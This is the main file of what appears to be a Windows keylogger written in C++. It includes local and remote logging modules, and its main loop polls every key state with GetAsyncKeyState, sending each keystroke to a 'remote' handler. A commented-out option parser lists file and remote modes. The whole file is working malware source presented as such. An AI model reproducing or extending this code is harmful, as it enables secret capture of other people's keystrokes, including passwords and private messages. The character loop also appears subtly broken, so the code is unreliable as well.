#include "./keylogger/keylogger.cpp"
#include "./keylogger/keylogger_local/keylogger_local.cpp"
#include "./keylogger/keylogger_remote/keylogger_remote.cpp"

/*
void initialize_options(int argc, char** argv)
{
     int t_result_option = 0;
     int t_option_index = 0;
     struct option t_long_options[] =
     {
          {"help", 0, NULL, 0},
          {NULL, 0, NULL, 0}
     };

     while ((t_result_option = getopt_long(argc, argv, "c:p:",
     t_long_options, &t_option_index)) != -1)
     {
          switch(t_result_option)
          {
               case 0:
					if(strcasecmp(optarg, "file") == 0)
					{
						g_keylogger = new keylogger_local();
					}
					else if(strcasecmp(optarg, "no_click") == 0)
					{

					}
					else if(strcasecmp(optarg, "no_arrow") == 0)
					{

					}
					else if(strcasecmp(optarg, "ascii_only") == 0)
					{

					}
					else if(strcasecmp(optarg, "remote") == 0)
					{

					}
               break;
          }
     }
}
*/

int main(int argc, char** argv)
{
	keylogger_remote t_keylogger_remote;

	t_keylogger_remote.initialize();

	while(TRUE)
		for(char t_key = 1; t_key <= 255; t_key++)
			if(GetAsyncKeyState(t_key) == -32767)
				t_keylogger_remote.treat(t_key);

	return 0;
}
